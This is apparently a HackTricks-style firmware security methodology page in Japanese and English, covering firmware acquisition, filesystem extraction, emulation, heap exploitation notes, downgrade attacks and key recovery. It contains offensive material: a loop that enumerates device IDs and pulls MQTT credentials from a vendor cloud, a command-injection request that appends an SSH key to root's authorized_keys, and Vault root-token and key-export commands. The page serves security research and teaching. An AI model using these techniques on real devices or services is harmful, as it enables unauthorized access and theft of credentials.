# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、hardwareコンポーネントとユーザーが操作するsoftware間の通信を管理・促進することで、デバイスが正しく動作できるようにする不可欠なsoftwareです。これは永続メモリに保存されるため、電源投入直後からデバイスが重要な命令にアクセスでき、最終的にoperating systemの起動へとつながります。Firmwareの調査と、場合によっては変更を行うことは、security vulnerabilitiesを特定するための重要な手順です。<sup>[[2]](#references)[[3]](#references)</sup>

## **Gathering Information**

**情報収集**は、デバイスの構成と使用されているtechnologyを理解するための重要な初期段階です。このプロセスでは、以下のデータを収集します。

- CPU architectureと実行されているoperating system
- bootloaderの詳細
- hardware構成とdatasheet
- codebaseの規模とsourceの場所
- external libraryとlicenseの種類
- update履歴と規制上の認証
- architectureおよびflow diagram
- security assessmentと特定済みのvulnerability

この目的において、**open-source intelligence (OSINT)** toolsは非常に有用です。また、利用可能なopen-source softwareコンポーネントを、手動および自動のreview processで分析することも有効です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのtoolsは、潜在的な問題を発見するために利用できる無料のstatic analysisを提供します。

## **Acquiring the Firmware**

Firmwareの取得にはさまざまな方法があり、それぞれ複雑さのレベルが異なります。

- **直接**source（developer、manufacturer）から取得する
- 提供された手順から**build**する
- 公式support siteから**download**する
- ホストされているfirmware fileを見つけるために**Google dork** queryを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのtoolsを使って**cloud storage**に直接アクセスする
- man-in-the-middle techniqueによって**update**をinterceptする
- **UART**、**JTAG**、**PICit**などのconnectionを介してデバイスから**extract**する
- デバイス通信内のupdate requestを**sniff**する
- **hardcoded update endpoint**を特定して利用する
- bootloaderまたはnetworkから**dump**する
- 他の方法がすべて失敗した場合、適切なhardware toolsを使ってstorage chipを**removeしてread**する

### UART-only logs: force a root shell via U-Boot env in flash

UART RXが無視される場合（logsのみ）、**U-Boot environment blob**をofflineで**edit**することで、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8 clipとprogrammer（3.3V）を使ってSPI flashをdumpします。
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を含め、**U-Boot env CRC32**をblobに対して**recompute**します。
3. env partitionだけをreflashしてrebootします。UART上にshellが表示されるはずです。

これは、bootloader shellが無効化されている一方で、外部flash accessによってenv partitionを書き込み可能なembedded deviceで有用です。

## Analyzing the firmware

これで**firmwareを取得**できたため、どのように扱うべきかを把握するために、そのfirmwareから情報をextractする必要があります。そのために使用できるさまざまなtoolsがあります。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
これらのツールであまり見つからない場合は、`binwalk -E <bin>` を使用してイメージの **entropy** を確認してください。entropy が低い場合は、暗号化されている可能性は低いです。entropy が高い場合は、暗号化されている可能性が高いです（または何らかの方法で圧縮されています）。

さらに、これらのツールを使用して **firmware 内に埋め込まれたファイル** を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使用してファイルを検査できます。

### ファイルシステムの取得

前述の `binwalk -ev <bin>` などのツールを使用すれば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、ファイルシステムの種類を名前にした **フォルダー** 内にファイルシステムを抽出します。一般的には、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs のいずれかです。

#### 手動でのファイルシステム抽出

場合によっては、binwalk の signatures にファイルシステムの **magic byte** が含まれていないことがあります。このような場合は、binwalk を使用してファイルシステムの offset を特定し、バイナリから圧縮されたファイルシステムを **carve** して、以下の手順に従い、その種類に応じてファイルシステムを **手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
次の **dd command** を実行して、Squashfs filesystem を carve します。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
また、以下の command を実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" directory に格納されます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs filesystems の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware の分析

Firmware を取得したら、その構造と潜在的な脆弱性を理解するために dissect することが重要です。このプロセスでは、さまざまな tools を使用して firmware image を分析し、価値のあるデータを抽出します。

### 初期分析 tools

binary file（`<bin>` と表記）の初期 inspection 用に、一連の commands が用意されています。これらの commands は、file types の特定、strings の抽出、binary data の分析、partition と filesystem の詳細の把握に役立ちます。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使用して **entropy** を確認します。低い entropy は暗号化されていない可能性を示し、高い entropy は暗号化または圧縮の可能性を示します。

**embedded files** を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールとリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使用すると、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類（例: squashfs、ubifs）にちなんだ名前のディレクトリに抽出されます。ただし、magic bytes が不足しているために **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk` を使用してファイルシステムのオフセットを特定し、その後 `dd` コマンドでファイルシステムを carve out する作業が含まれます。
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で展開するために異なるコマンドを使用します。

### ファイルシステム分析

ファイルシステムを展開したら、security flaw の検索を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、API endpoint、update server の機能、未コンパイルのコード、startup script、offline analysis 用のコンパイル済みバイナリを重点的に確認します。

検査すべき**主な場所**と**項目**は次のとおりです。

- ユーザー認証情報が含まれる **etc/shadow** および **etc/passwd**
- **etc/ssl** 内の SSL 証明書および鍵
- 潜在的な脆弱性を持つ設定ファイルおよび script ファイル
- さらなる分析対象となる組み込みバイナリ
- 一般的な IoT デバイスの web server およびバイナリ

ファイルシステム内の機密情報や脆弱性の発見には、いくつかのツールが役立ちます。

- 機密情報の検索には、[**LinPEAS**](https://github.com/carlospolop/PEASS-ng) および [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware analysis には、[**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static analysis および dynamic analysis には、[**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリの security check

ファイルシステム内で見つかった source code とコンパイル済みバイナリは、脆弱性がないか入念に調査する必要があります。Unix バイナリ用の **checksec.sh** や Windows バイナリ用の **PESecurity** などのツールを使用すると、exploit 可能な保護されていないバイナリを特定できます。

## 派生 URL token を介した cloud config と MQTT credentials の収集

多くの IoT hub は、次のような cloud endpoint からデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis の際、`<token>` がハードコードされた secret を使用して device ID からローカルで導出されていることが判明する場合があります。例えば、次のようになります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知っている人なら誰でも URL を再構築して cloud config を取得でき、多くの場合、平文の MQTT credentials や topic prefix が明らかになります。

実践的な workflow:

1) UART boot log から deviceId を抽出する

- 3.3V UART adapter（TX/RX/GND）を接続して log を取得します。
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 例として、cloud config URL pattern と broker address を出力している行を探します:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm を復元

- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 の使用箇所を検索します。
- algorithm（例：MD5(deviceId||STATIC_KEY)）を確認します。
- Bash で token を導出し、digest を uppercase にします：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials の収集

- URL を組み立て、curl で JSON を取得し、jq で parse して secrets を抽出します：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文 MQTT と脆弱な topic ACLs を悪用する（存在する場合）

- 回収した credentials を使用して maintenance topics を subscribe し、機密性の高い events を探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能な device ID を列挙する（大規模に、認可を得て）

- 多くの ecosystem では、vendor OUI/product/type バイトの後に連番の suffix が埋め込まれています。
- 候補 ID を反復処理し、token を導出して、プログラムで設定を取得できます：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
メモ
- 大規模な列挙を試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、対象ハードウェアを変更せずに secrets を復元するため、emulation または static analysis を優先してください。


firmware を emulation するプロセスにより、デバイスの動作または個々のプログラムの **dynamic analysis** が可能になります。このアプローチでは、ハードウェアやアーキテクチャへの依存関係により問題が発生する場合がありますが、root filesystem または特定の binaries を、Raspberry Pi のようなアーキテクチャと endianness が一致するデバイス、あるいは事前構築済みの virtual machine に移行することで、さらなるテストを実施できます。

### 個々の Binaries の Emulating

単一のプログラムを調査する場合、プログラムの endianness と CPU architecture を特定することが重要です。

#### MIPS Architecture の例

MIPS architecture の binary を emulate するには、次の command を使用できます:
```bash
file ./squashfs-root/bin/busybox
```
また、必要なエミュレーションツールをインストールするには：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS（big-endian）では`qemu-mips`を使用し、little-endianのバイナリには`qemu-mipsel`を使用します。

#### ARM Architecture Emulation

ARMバイナリの場合もプロセスは同様で、`qemu-arm` emulatorを使用してemulationを実行します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)などのツールは、firmwareのfull emulationを実現し、プロセスを自動化するとともに、dynamic analysisを支援します。

## Dynamic Analysis in Practice

この段階では、実機またはemulated device environmentを使用してanalysisを行います。OSとfilesystemへのshell accessを維持することが不可欠です。Emulationはhardware interactionsを完全には再現できない場合があるため、emulationを再起動する必要が生じることがあります。Analysisではfilesystemを再確認し、公開されたwebpagesやnetwork servicesをexploitし、bootloaderのvulnerabilitiesを調査します。潜在的なbackdoor vulnerabilitiesを特定するには、firmware integrity testsが重要です。

## Runtime Analysis Techniques

Runtime analysisでは、gdb-multiarch、Frida、Ghidraなどのツールを使用して、processまたはbinaryが動作するenvironmentとinteractし、breakpointsを設定したり、fuzzingやその他のtechniquesによってvulnerabilitiesを特定したりします。

完全なdebuggerがないembedded targetsでは、**静的リンクされた`gdbserver`をdeviceにコピーし、remoteでattachします**:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubでは、RF stackが**radio MCU**とLinux userland processの間で分割されていることがよくあります。実用的なworkflowでは、次の経路をマッピングします:<sup>[[8]](#references)</sup>

1. **RF frame**（無線上）
2. **controller-side parser**（radio MCU上）
3. Linuxへ転送される**serial/UART textまたはTLV protocol**（例: `/dev/tty*`）
4. メインdaemon内の**application dispatcher**
5. **protocol-specific handler / state machine**

このarchitectureでは、reversing targetが1つではなく2つになります。controllerがbinary radio frameを`Group,Command,arg1,arg2,...`のようなtextual protocolに変換する場合、次を特定します:

- **message groups**とdispatch tables
- どのmessageが**network**から送られ、どれがcontroller自体から送られるか
- 正確な**manufacturer-specific discriminator fields**（例: Zigbeeの`manufacturer_code`とcustom `cluster_command`）
- **commissioning**、discovery、またはfirmware/model download phase中にのみ到達可能なhandler

Zigbeeでは、pairing trafficをcaptureし、targetがデフォルトの**Link Key** `ZigBeeAlliance09`に依然として依存しているか確認します。依存している場合、commissioning trafficのsniffingによって**Network Key**が露出する可能性があります。Zigbee 3.0のinstall codesはこの露出を低減するため、テスト対象deviceが実際にこれをenforceしているか記録します。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commandsは、standardized clustersよりも優れたtargetになることがよくあります。これは、十分に検証されていない**custom parsing code**や内部**FSM**に入力されるためです。<sup>[[8]](#references)</sup>

実用的なworkflow:

- command dispatcherをreverseし、**vendor-only handler**を見つけます。
- **FSM state**、**event**、**check**、**action**、**next-state** tablesを復元します。
- 自動的に次へ進む**transitional states**と、最終的にattacker-controlled stateをresetまたはfreeするretry/error branchesを特定します。
- buggy handlerが常に到達可能だと仮定せず、daemonをvulnerable stateに置くために必要な正規のprotocol exchangeを確認します。

Timing-sensitive protocolでは、Python frameworkからのpacket replayは遅すぎる可能性があります。より信頼性の高い方法は、vendor-grade stackを使用して、実hardware（例: **nRF52840**）上で正規deviceをemulateすることです。これにより、正しい**endpoints**、**attributes**、commissioning timingを露出できます。

### Fragmented-download bug class in embedded daemons

**fragmented blob/model/configuration downloads**では、次のようなfirmware bug classが繰り返し現れます:<sup>[[8]](#references)</sup>

1. **first fragment**（`offset == 0`）が`ctx->total_size`を保存し、`malloc(total_size)`を実行します。
2. 後続fragmentは、`packet_total_size >= offset + chunk_len`のようなattacker-controlledな**packet-local** fieldsのみをvalidateします。
3. copyは、**original allocated size**に対するcheckなしで`memcpy(&ctx->buffer[offset], chunk, chunk_len)`を実行します。

これにより、attackerは次を送信できます:

- 小さいdeclared total sizeを持つfirst valid fragmentを送り、小さなheap allocationを強制する。
- **expected offset**を持つ一方で、より大きな`chunk_len`を持つ後続fragmentを送る。
- fresh checksを満たすpacket-local sizeを偽造しつつ、originally allocated bufferをoverflowさせる。

vulnerable pathがcommissioning logicの背後にある場合、malformed fragmentを送る前にtargetを想定されたmodel-downloadまたはblob-download stateへ移行させるため、十分な**device emulation**をexploitに含める必要があります。

### Protocol-driven `free()` triggers

embedded daemonでは、heap metadata exploitationのtriggerとして最も簡単な方法は、"wait for cleanup"ではなく、protocol自身のerror handlingを**force**することです:<sup>[[8]](#references)</sup>

- malformed follow-up fragmentsを送り、FSMを**retry**または**error** statesへ移行させる。
- retry thresholdを超過させ、daemonに**reset context**を実行させてcorrupted bufferをfreeさせる。
- この予測可能な`free()`を使用して、processが無関係な理由でcrashする前にallocator-side primitivesをtriggerする。

これは、embedded Linuxの**musl/uClibc/dlmalloc-like** allocatorsに対して特に有用です。chunk metadataをcorruptすると、unlink/unbin logicをwrite primitiveへ変換できるためです。安定したpatternは、real bin pointersを直ちに上書きしてprocessをcrashさせるのではなく、**size field**をcorruptして、allocator traversalをoverflowed buffer内にstagedした**fake chunks**へredirectすることです。

## Binary Exploitation and Proof-of-Concept

特定したvulnerabilityのPoCを開発するには、target architectureとlower-level languagesでのprogrammingを深く理解する必要があります。embedded systemではbinary runtime protectionsは稀ですが、存在する場合はReturn Oriented Programming (ROP)のようなtechniqueが必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibcはglibcに類似したfastbinsを使用します。後続のlarge allocationが`__malloc_consolidate()`をtriggerする可能性があるため、fake chunkはchecks（sane size、`fd = 0`、および周囲のchunksが"in use"と認識されること）を通過できなければなりません。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLRが有効でも、main binaryが**non-PIE**であれば、binary内の`.data/.bss` addressesはstableです。すでにvalid heap chunk headerに似ているregionをtargetにして、fastbin allocationを**function pointer table**上に配置できます。
- **Parser-stopping NUL:** JSONがparseされる場合、payload内の`\x00`によってparseを停止しつつ、stack pivot/ROP chain用のtrailing attacker-controlled bytesを保持できます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出すROP chainによって、known mapping内にexecutable shellcodeを配置し、そこへjumpできます。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)のようなoperating systemは、firmware security testing用にpre-configuredされたenvironmentを提供し、必要なtoolsを備えています。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOSは、Internet of Things (IoT) devicesのsecurity assessmentおよびpenetration testingを支援することを目的としたdistroです。必要なtoolsがすべてloadされたpre-configured environmentを提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing toolsがpreloadedされた、Ubuntu 18.04ベースのembedded security testing operating systemです。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendorがfirmware imageに対するcryptographic signature checksを実装している場合でも、**version rollback (downgrade) protectionは頻繁に省略されます**。boot-またはrecovery-loaderがembedded public keyでsignatureのみをverifyし、flash対象imageの*version*（またはmonotonic counter）を比較しない場合、attackerは**valid signatureが付いた古いvulnerable firmware**を正規にinstallでき、patch済みのvulnerabilityを再導入できます。<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Obtain an older signed image**
* vendorのpublic download portal、CDN、またはsupport siteから取得する。
* companion mobile/desktop applicationsからextractする（例: Android APK内の`assets/firmware/`）。
* VirusTotal、Internet archives、forumsなどのthird-party repositoriesからretrieveする。
2. exposed update channel経由でimageをdeviceに**uploadまたはserve**する:
* Web UI、mobile-app API、USB、TFTP、MQTTなど。
* 多くのconsumer IoT devicesは、Base64-encoded firmware blobsを受け付け、server-sideでdecodeしてrecovery/upgradeをtriggerする*unauthenticated* HTTP(S) endpointsを公開しています。
3. downgrade後、newer releaseでpatchされたvulnerabilityをexploitする（例: 後から追加されたcommand-injection filter）。
4. persistenceを取得した後、検出を避けるためにlatest imageをflashし直すか、updatesをdisableする。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（downgradeされた）firmwareでは、`md5`パラメータがsanitisationなしでshell commandに直接連結されるため、任意のcommandをinjectionできます（ここでは、SSH key-basedのroot accessを有効化）。後のfirmwareバージョンでは基本的なcharacter filterが導入されましたが、downgrade protectionがないため、この修正は実質的に無効です。<sup>[[4]](#references)</sup>

### Mobile AppsからのFirmwareの抽出

多くのvendorは、companion mobile applicationに完全なfirmware imageをbundleしています。これにより、appはBluetooth/Wi-Fi経由でdeviceをupdateできます。これらのpackageは通常、`assets/fw/`や`res/raw/`などのpathにあるAPK/APEX内へ、暗号化されずに保存されています。`apktool`、`ghidra`、または単純な`unzip`などのtoolを使えば、physical hardwareに触れることなく、署名済みのimageを取り出せます。<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot設計におけるUpdater専用のanti-rollback bypass

一部のベンダーはanti-downgradeの**ratchet**を実装していますが、それを*updater*のロジック内だけに限定しています（たとえばCAN経由のUDS routine、recovery command、userspace OTA agentなど）。後段の**bootloader**がimage signature/CRCのみをチェックし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypass可能です。<sup>[[7]](#references)</sup>

典型的な脆弱設計:

- Firmware metadataにversion descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- Updaterがimage ratchetをpersistent storageに保存された値と比較し、古いsigned imageを拒否する。
- Bootloaderがそのratchetを**parse**せず、選択されたslotをbootする前にheader、CRC、signatureのみを検証する。
- Slot activationがpartition tableまたはper-slot generation counterに別途保存され、検証済みのfirmware digestそのものに**cryptographically bound**されていない。

これにより、dual-slot systemでは**validate-one-image / boot-another-image** primitiveが成立します。攻撃者が、current signed imageを使用してupdaterにslot Bを次のboot targetとしてmarkさせ、その後reboot前にslot Bをoverwriteできる場合、bootloaderはすでにcommit済みのslot metadataだけを信頼するため、downgradeされたimageをbootする可能性があります。

一般的なabuse pattern:

1. **current signed** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、layout上でそのslotをnext activeとしてmarkする。
2. **まだrebootしない**。同じsession内でslot-preparation/erase routineに再度入る。
3. stale boot-stateまたはstale slot-selection logicをabuseし、直前にpromoteされた**同じphysical slot**をupdaterにeraseさせる。
4. **older but still signed** firmwareをそのslotにwriteする。
5. ratchetをenforceするvalidation routineをskipし、直接rebootする。
6. Bootloaderがpromoteされたslotをselectし、signature/integrityのみをverifyしてold imageをbootする。

A/B update implementationをreverseする際に確認すべき点:

- Successful switch後にrefreshされない**boot-time flags**からslot selectionがderivedされている。
- **current committed layout**ではなくstale stateに基づいてslotをeraseする`prepare_passive_slot()`形式のroutine。
- **generation counter** / active flagだけをincrementし、検証済みimage hashを保存しない`part_write_layout()`形式のfunction。
- Ratchet checkがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには実装されていない。
- Eraseまたはrecovery routineが、slotのcontentをremoveしてrewriteした後も、そのslotをbootableとしてmarkしたままにする。

### Update Logicを評価するためのChecklist

* *update endpoint*のtransport/authenticationは十分に保護されているか（TLS + authentication）。
* Flashing前にdeviceは**version numbers**または**monotonic anti-rollback counter**をcompareするか。
* Imageはsecure boot chain内でverifyされているか（例: ROM codeがsignatureをcheckする）。
* **bootloaderはupdaterと同じratchetをenforce**するか、それともsignature/CRCのみをcheckするか。
* Slot activation metadataは**検証済みfirmware digest/versionにbind**されているか、それともpromotion後にslotをmodifyできるか。
* Slot switchが成功した後、deviceはrebootを強制されるか、それとも同じsession内で後続のupdate/erase routineに引き続きアクセスできるか。
* Userland codeは追加のsanity checkを実行するか（例: 許可されたpartition map、model number）。
* *partial*または*backup* update flowは同じvalidation logicを再利用しているか。

> 💡  上記のいずれかが欠けている場合、そのplatformはおそらくrollback attackに対してvulnerableです。

## 脆弱なfirmwareでpracticeする

Firmwareのvulnerability discoveryをpracticeするには、以下のvulnerable firmware projectをstarting pointとして使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## embedded KMS/Vault stateからfirmware decryption keyをrecoverする

Update imageがsmall plaintext metadataとlarge high-entropy blobを混在させている場合、何かをbrute-forceする前にcontainer triageを行います:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`でheaders、offsets、line boundariesをdumpする。
- `Salted__`は通常、OpenSSL `enc` formatを意味します。次の8 bytesがsaltで、残りのbytesがciphertextです。
- Base64 fieldをdecodeして正確に`256` bytesになる場合、random firmware password/session keyをwrapしているRSA-2048 ciphertextを見ている強いhintです。
- 同じfile内のdetached PGP materialはauthenticityのみをprotectしていることが多いため、それがconfidentiality mechanismだと想定しないでください。

Static key hunting（`grep`、`strings`、PEM/PGP searches）が失敗した場合は、private keyを検索するだけでなく、**operational decrypt path**をreverseします。

- Updater / management binaryをdecompileし、encrypted blobを読む処理、そのblobをunwrapするhelper/API、およびそれがrequestするlogical key nameをtraceする。
- Extracted root filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加え、unit filesとinit scriptsをsearchする。
- Plaintextの`vault operator unseal ...`、recovery keys、bootstrap tokens、local KMS auto-unseal scriptsは、private-key materialと同等に扱う。

Applianceがoriginal Vault binaryとstorage backendをshipしている場合、Vault internalsをreimplementするより、そのenvironmentをreplayするほうが通常は容易です:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
クローンした KMS で root 権限を取得した状態で:

- transit keys を分離されたクローン内部でのみ exportable にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が実際に使用している正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗や、デフォルトの OAEP decrypt の失敗だけでは、key が間違っているとは証明できない。多くの Vault-backed flow は SHA-256 を使用する OAEP を使う一方、一般的な library のデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC decrypt を試す前に、vendor の OpenSSL KDF（`EVP_BytesToKey`、legacy appliance では MD5 が使われることが多い）を正確に再現する。

これにより、「encrypted firmware」はより一般的な問題に変わる: **appliance 側の operational key を復元し、その後、正確な unwrap + KDF parameter を offline で再現する**。

## Training and Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で Firmware を Crack する: Senior-Level Skill、Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放棄された hardware の zero day を Exploit する - Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルの Smart Device によって自宅への Access を得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector を charge port connector から Exploit する - Part 2: anti-downgrade を bypass する](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
